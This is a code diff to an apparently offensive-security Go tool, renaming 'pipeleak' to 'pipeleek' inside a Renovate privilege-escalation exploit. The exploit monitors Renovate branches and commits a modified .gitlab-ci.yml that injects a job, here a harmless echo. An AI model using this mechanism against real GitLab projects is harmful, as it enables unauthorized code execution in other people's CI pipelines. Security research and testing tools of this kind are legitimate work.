@@ -3,7 +3,7 @@ package renovate
 import (
 	"regexp"
 
-	"github.com/CompassSecurity/pipeleak/pkg/gitlab/util"
+	"github.com/CompassSecurity/pipeleek/pkg/gitlab/util"
 	"github.com/rs/zerolog/log"
 	gogitlab "gitlab.com/gitlab-org/api/client-go"
 	ci "gitlab.com/mitchenielsen/gitlab-ci-go"
@@ -44,10 +44,10 @@ func RunExploit(gitlabUrl, gitlabApiToken, repoName, renovateBranchesRegex strin
 	branch := monitorBranches(git, project, regex)
 	cicd := getBranchCiCdYml(git, project, *branch)
 	log.Info().Str("branch", branch.Name).Msg("Modifying CI/CD configuration")
-	cicd["pipeleak-renovate-privesc"] = ci.JobConfig{
+	cicd["pipeleek-renovate-privesc"] = ci.JobConfig{
 		Stage:        "test",
 		Image:        "alpine:latest",
-		Script:       []string{"echo 'This is a test job for Pipeleak Renovate Privilege Escalation exploit'"},
+		Script:       []string{"echo 'This is a test job for Pipeleek Renovate Privilege Escalation exploit'"},
 		AllowFailure: true,
 	}
 
@@ -170,7 +170,7 @@ func updateCiCdYml(yml map[string]interface{}, git *gogitlab.Client, project *go
 	fileInfo, _, err := git.RepositoryFiles.UpdateFile(project.ID, ".gitlab-ci.yml", &gogitlab.UpdateFileOptions{
 		Branch:        gogitlab.Ptr(branch.Name),
 		Content:       gogitlab.Ptr(string(cicdYaml)),
-		CommitMessage: gogitlab.Ptr("Update .gitlab-ci.yml for Pipeleak Renovate Privilege Escalation exploit"),
+		CommitMessage: gogitlab.Ptr("Update .gitlab-ci.yml for Pipeleek Renovate Privilege Escalation exploit"),
 	})
 
 	if err != nil {
